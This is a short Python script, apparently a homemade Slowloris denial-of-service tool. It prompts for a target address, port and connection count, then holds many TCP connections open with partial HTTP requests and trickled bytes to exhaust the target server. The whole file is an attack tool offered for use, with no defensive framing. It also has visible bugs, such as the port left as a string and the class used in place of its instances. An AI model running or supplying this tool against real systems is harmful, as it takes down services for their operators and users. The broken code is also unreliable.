import socket, _thread, time

class Loris():

    rHost = None
    socket = None
    thread = None
    running = True
    primerSent = True
    id = None

    def send(self, data):
        try:
            self.socket.send(str(data).encode("UTF-8"))
            return True
        except socket.error:
            return False

    def attack(self):
        print(str(self.id)+" is attack")
        self.running = True
        self.send(("GET "+self.rHost+" HTTP/1.0\n"))
        while(self.running):
            self.send(" ")
            time.sleep(10)

    def __init__(self, rHost, rPort, id):
        self.rHost = rHost
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.socket.connect((rHost, rPort))
        except socket.error:
            self.running = False
            return
        self.thread = _thread.start_new_thread(self.attack, ())
        self.id = id+1

def Main():
    lori = []
    running = True
    numberOfLori = input("How many lori? ")
    addr = input("What is the target's Address? ")
    port = input("What is the target's Port?")


    for x in range(int(numberOfLori)-1):
        Loris(addr, port, x)
        if(not Loris.running):
            print("Loris Could Not Connect Stopping Attack")
            break
        lori.append(Loris)

    while(running):
        time.sleep(1)
        command = input(">> ")
        if(command == ":q"):
            running = False
        print("Command Not Recognised")

if __name__ == "__main__":
    Main()
